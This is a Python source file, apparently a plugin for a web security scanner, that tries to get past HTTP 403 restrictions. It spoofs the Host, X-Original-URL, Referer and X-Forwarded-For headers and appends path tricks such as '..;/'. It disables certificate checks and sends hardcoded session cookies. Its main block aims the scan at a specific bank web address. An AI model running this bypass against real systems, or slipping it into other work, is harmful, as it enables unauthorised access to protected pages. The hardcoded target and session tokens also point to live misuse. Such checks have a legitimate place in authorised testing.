from ClassCongregation import color
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

Trust_Domain = ['www.baidu.com','www.google.com','home.firefoxchina.cn','www.zhihu.com','www.csdn.net','www.weibo.com']
Trust_Original = ['/admin','/console']
Trust_Referer = ['http://www.baidu.com']
Trust_Proxy = ['127.0.0.1', '114.114.114.114']
Trust_Extend = ['/', '//', '/*', '/*/', '/.', '/./', '/./.', '?', '??', '???', '..;/', '/..;/', '%20/', '%09/']

org_headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US, en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'close',
    'Cookie': 'currentMenuCode=1370236658088816640; JSESSIONID=06F81F3063191B2508149934FA5115A2; jeesite.session.id=ca4b0bb8c18f4d72b9a4a36035cad00f; pageNo=1',
}

proxies = {
  "http": "http://127.0.0.1:8080",
  "https": "http://127.0.0.1:8080",
}
TIMEOUT = 2
def Change_Host(url, TIMEOUT=TIMEOUT):
    for i in Trust_Domain:
        headers = {
            'Host': '%s'%i,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US, en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close',
            'Cookie': 'currentMenuCode=1370236658088816640; JSESSIONID=06F81F3063191B2508149934FA5115A2; jeesite.session.id=ca4b0bb8c18f4d72b9a4a36035cad00f; pageNo=1'
        }
        try:
            resp_code = requests.get(url=url, headers=headers, 
                                timeout=TIMEOUT, 
                                allow_redirects=False, 
                                verify = False).status_code
            if resp_code == 200:
                color('[+] Host: %s %s'%(i, resp_code), 'green')
            elif resp_code != 403:
                color('[?] Host: %s %s'%(i, resp_code), 'blue')
            else:
                color('[-] Host: %s %s'%(i, resp_code), 'red')
        except Exception as error:
            color('[-] Host: %s done!'%i, 'red')
            continue

def Add_Original(url, TIMEOUT=TIMEOUT):
    for i in Trust_Original:
        Add_headers = {
            'X-Original-URL': i,
            'X-Rewrite-URL': i
        }
        headers = {**org_headers, **Add_headers}
        try:
            resp_code = requests.get(url=url, headers=headers, 
                                timeout=TIMEOUT, 
                                allow_redirects=False,
                                #proxies=proxies, 
                                verify = False).status_code
            if resp_code == 200:
                color('[+] X-Original-URL/X-Rewrite-URL: %s %s'%(i, resp_code), 'green')
            elif resp_code != 403:
                color('[?] X-Original-URL/X-Rewrite-URL: %s %s'%(i, resp_code), 'blue')
            else:
                color('[-] X-Original-URL/X-Rewrite-URL: %s %s'%(i, resp_code), 'red')
        except Exception as error:
            color('[-] X-Original-URL/X-Rewrite-URL: %s done!'%(i), 'red')
            continue

def Add_Referer(url, TIMEOUT=TIMEOUT):
    for i in Trust_Referer:
        Add_headers = {
            'Referer': i
        }
        headers = {**org_headers, **Add_headers}
        try:
            resp_code = requests.get(url=url, headers=headers,
                                timeout=TIMEOUT, 
                                allow_redirects=False, 
                                verify = False).status_code
            if resp_code == 200:
                color('[+] Referer: %s %s'%(i, resp_code), 'green')
            elif resp_code != 403:
                color('[?] Referer: %s %s'%(i, resp_code), 'blue')
            else:
                color('[-] Referer: %s %s'%(i, resp_code), 'red')
        except Exception as error:
            color('[-] Referer: %s done!'%(i), 'red')
            continue
    
def Add_Proxy(url, TIMEOUT=TIMEOUT):
    for Trust_IP in Trust_Proxy:
        Add_headers = {
            'X-Originating-IP': Trust_IP,
            'X-Remote-IP': Trust_IP,
            'X-Client-IP': Trust_IP,
            'X-Forwarded-For': Trust_IP,
            'X-Forwared-Host': Trust_IP,
            'X-Host': Trust_IP,
            'X-Custom-IP-Authorization': Trust_IP
        }
        headers = {**org_headers, **Add_headers}
        try:
            resp_code = requests.get(url=url, headers=headers, 
                                timeout=TIMEOUT, 
                                allow_redirects=False, 
                                verify = False).status_code
            if resp_code == 200:
                color('[+] X-Forwarded-For: %s %s'%(Trust_IP, resp_code), 'green')
            elif resp_code != 403:
                color('[?] X-Forwarded-For: %s %s'%(Trust_IP, resp_code), 'blue')
            else:
                color('[-] X-Forwarded-For: %s %s'%(Trust_IP, resp_code), 'red')
        except Exception as error:
            color('[-] X-Forwarded-For: %s done!'%(Trust_IP), 'red')
            continue

def Add_Extend(url, TIMEOUT=TIMEOUT):
    for i in Trust_Extend:
        url_new = url + i
        try:
            resp_code = requests.get(url=url_new, headers=org_headers, 
                                timeout=TIMEOUT, 
                                allow_redirects=False, 
                                verify = False).status_code
            if resp_code == 200:
                color('[+] url: %s %s'%(url_new, resp_code), 'green')
            elif resp_code != 403:
                color('[?] url: %s %s'%(url_new, resp_code), 'blue')
            else:
                color('[-] url: %s %s'%(url_new, resp_code), 'red')
        except Exception as error:
            color('[-] url: %s done!'%(url_new), 'red')
            continue
        finally:
            url_new = None

def check(**kwargs):
    url = kwargs['url']
    #url = 'https://moa.cmbc.com.cn/moastatic'
    try:
        resp_code = requests.get(url=url, headers=org_headers, 
                            timeout=TIMEOUT,
                            #allow_redirects=False, 
                            verify = False).status_code
        if resp_code != 403:
            color('[-] Page has not return 403!', 'red')
            return
    except Exception as error:
        color('[-] An error occurred %s'%type(error), 'red')
        return
    #url = url.strip('/')
    color('[*] Scanning target domain %s'%url, 'green')
    Change_Host(url)
    Add_Original(url)
    Add_Referer(url)
    Add_Proxy(url)
    Add_Extend(url)

if __name__ == "__main__":
    check(**{'url':'https://moa.cmbc.com.cn/moastatic/'})











